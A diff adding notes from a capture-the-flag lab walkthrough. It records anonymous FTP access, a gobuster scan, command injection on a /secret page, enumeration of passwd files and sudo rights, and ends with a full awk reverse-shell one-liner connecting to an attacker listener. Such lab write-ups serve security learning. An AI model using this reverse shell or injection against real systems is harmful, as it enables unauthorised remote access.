@@ -30,3 +30,105 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.29 (Ubuntu)
 |_http-title: Game Info
 MAC Address: 02:99:E3:36:7A:2D (Unknown)
+
+========================================================================================================
+
+ftp 10.10.212.225
+Connected to 10.10.212.225.
+220 (vsFTPd 3.0.3)
+Name (10.10.212.225:root): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+
+
+150 Here comes the directory listing.
+-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
+226 Directory send OK.
+ftp> get note.txt
+
+
+ cat note.txt
+Anurodh told me that there is some filtering on strings being put in the command -- Apaar
+
+
+navigate to port 80
+
+gobuster dir -u http://10.10.212.225 -w /usr/share/wordlists/dirb/big.txt -x html,php
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.212.225
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     html,php
+[+] Timeout:        10s
+===============================================================
+2024/03/17 02:57:49 Starting gobuster
+===============================================================
+/.htpasswd (Status: 403)
+/.htpasswd.html (Status: 403)
+/.htpasswd.php (Status: 403)
+/.htaccess (Status: 403)
+/.htaccess.html (Status: 403)
+/.htaccess.php (Status: 403)
+/about.html (Status: 200)
+/blog.html (Status: 200)
+/contact.html (Status: 200)
+/contact.php (Status: 200)
+/css (Status: 301)
+/fonts (Status: 301)
+/images (Status: 301)
+/index.html (Status: 200)
+/js (Status: 301)
+/news.html (Status: 200)
+/secret (Status: 301)
+/server-status (Status: 403)
+/team.html (Status: 200)
+
+/secret has a command injection spot
+
+
+
+command=find / -type f -iname "*passwd"
+
+/etc/cron.daily/passwd
+/etc/pam.d/chpasswd
+/etc/pam.d/passwd
+/etc/passwd
+/etc/security/opasswd
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/htpasswd
+/usr/share/lintian/overrides/base-passwd
+/usr/share/lintian/overrides/passwd
+/usr/share/bash-completion/completions/gpasswd
+/usr/share/bash-completion/completions/chpasswd
+/usr/share/bash-completion/completions/passwd
+/usr/share/bash-completion/completions/htpasswd
+/usr/sbin/chpasswd
+/usr/sbin/update-passwd
+/usr/sbin/chgpasswd
+ls /home/apaar
+
+Matching Defaults entries for www-data on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User www-data may run the following commands on ubuntu: (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
+
+
+
+which passwd:
+/usr/bin/passwd
+
+locate .ssh:
+/home/apaar/.ssh /home/apaar/.ssh/authorized_keys
+
+lsb_release -a:
+Distributor ID: Ubuntu Description: Ubuntu 18.04.5 LTS Release: 18.04 Codename: bionic 
+
+
+
+we start a nc listener on 1235
+and input the following reverse shell command into the input:
+awk 'BEGIN {s = "/inet/tcp/0/10.10.93.33/1235"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
